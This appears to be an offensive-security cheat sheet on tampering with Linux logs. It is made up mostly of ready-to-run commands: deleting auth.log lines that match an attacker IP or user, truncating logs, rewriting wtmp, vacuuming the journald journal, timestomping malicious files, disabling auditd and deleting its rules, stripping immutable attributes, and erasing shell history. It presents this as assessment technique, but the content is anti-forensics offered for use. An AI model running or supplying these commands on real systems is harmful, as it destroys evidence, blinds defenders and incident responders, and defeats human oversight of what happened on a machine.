# Log Tampering

Techniques for manipulating Linux system logs during assessments.

---

## 1. Log Locations

| Log File | Content |
|----------|---------|
| `/var/log/auth.log` | Authentication events (Debian/Ubuntu) |
| `/var/log/secure` | Authentication events (RHEL/CentOS) |
| `/var/log/syslog` | General system log |
| `/var/log/wtmp` | Login records (binary — use `last`) |
| `/var/log/btmp` | Failed logins (binary — use `lastb`) |
| `/var/log/lastlog` | Last login per user |
| `/var/log/kern.log` | Kernel messages |
| `/var/log/audit/audit.log` | Auditd events |

---

## 2. Clear Specific Entries

```bash
# Remove lines matching IP or username
sed -i '/192.168.1.100/d' /var/log/auth.log
sed -i '/attacker_user/d' /var/log/auth.log

# Remove lines from time range
sed -i '/Oct 22 14:0/d' /var/log/auth.log

# Truncate log
cat /dev/null > /var/log/auth.log
truncate -s 0 /var/log/auth.log
```

---

## 3. Binary Log Manipulation (wtmp/btmp)

```bash
# View current entries
last -f /var/log/wtmp

# Edit with utmpdump
utmpdump /var/log/wtmp > /tmp/wtmp.txt
# Remove entries from /tmp/wtmp.txt
utmpdump -r /tmp/wtmp.txt > /var/log/wtmp
```

---

## 4. Journalctl (systemd)

```bash
# Vacuum old logs
sudo journalctl --vacuum-time=1s
sudo journalctl --vacuum-size=1M

# Rotate and clear
sudo journalctl --rotate
sudo journalctl --vacuum-time=1s

# Disable persistent journal: Storage=volatile in /etc/systemd/journald.conf
sudo systemctl restart systemd-journald
```

---

## 5. Timestomping

```bash
# Copy timestamp from another file
touch -r /etc/hostname /path/to/malicious_file

# Set specific timestamp
touch -t 202301011200.00 /path/to/file
```

---

## 6. Auditd Evasion

```bash
# Check if auditd running
systemctl status auditd
auditctl -l    # List rules

# Disable (requires root)
auditctl -e 0    # Disable auditing
auditctl -D      # Delete all rules

# Clear audit log
echo "" > /var/log/audit/audit.log
```

---

## 7. Immutable Log Detection

```bash
# Check for immutable/append-only attribute
lsattr /var/log/auth.log
# 'a' = append-only, 'i' = immutable

# Remove (requires CAP_LINUX_IMMUTABLE or root)
chattr -a /var/log/auth.log
chattr -i /var/log/auth.log
```

---

## 8. Shell History Cleanup

```bash
# Clear current session
history -c && history -w

# Disable history
unset HISTFILE
export HISTSIZE=0
set +o history

# Or redirect to /dev/null
export HISTFILE=/dev/null

# Clear files
cat /dev/null > ~/.bash_history
cat /dev/null > ~/.zsh_history
```

---

## 9. Syslog Forwarding Check

```bash
# If logs are forwarded remotely, local tampering is insufficient
grep -r "@@\|@" /etc/rsyslog.conf /etc/rsyslog.d/ 2>/dev/null
grep -r "forward\|remote" /etc/syslog-ng/ 2>/dev/null
```
